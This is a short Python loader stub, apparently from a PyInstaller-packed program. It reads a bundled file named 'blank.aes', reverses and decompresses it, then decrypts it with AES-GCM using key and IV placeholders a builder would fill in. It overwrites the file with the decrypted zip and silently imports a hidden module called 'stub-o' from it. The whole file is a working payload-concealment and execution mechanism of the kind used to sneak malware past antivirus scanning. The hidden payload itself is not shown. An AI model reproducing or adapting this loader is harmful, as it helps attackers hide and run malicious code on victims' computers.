import os
import sys
import base64
import zlib
from pyaes import AESModeOfOperationGCM
from zipimport import zipimporter

# Paths and module info
zip_file_path = os.path.join(sys._MEIPASS, "blank.aes")
module_name = "stub-o"

# Decode key and IV
key = base64.b64decode("%key%")
iv = base64.b64decode("%iv%")

# AES decryption function
def decrypt_data(key: bytes, iv: bytes, data: bytes) -> bytes:
    aes = AESModeOfOperationGCM(key, iv)
    return aes.decrypt(data)

# Process the encrypted zip
if os.path.isfile(zip_file_path):
    with open(zip_file_path, "rb") as file:
        encrypted_data = file.read()

    # Decompress reversed ciphertext
    compressed_data = encrypted_data[::-1]
    decrypted_compressed = zlib.decompress(compressed_data)

    # Decrypt using AES-GCM
    decrypted_data = decrypt_data(key, iv, decrypted_compressed)

    # Overwrite with decrypted zip
    with open(zip_file_path, "wb") as file:
        file.write(decrypted_data)

    # Import and load the module
    zipimporter(zip_file_path).load_module(module_name)
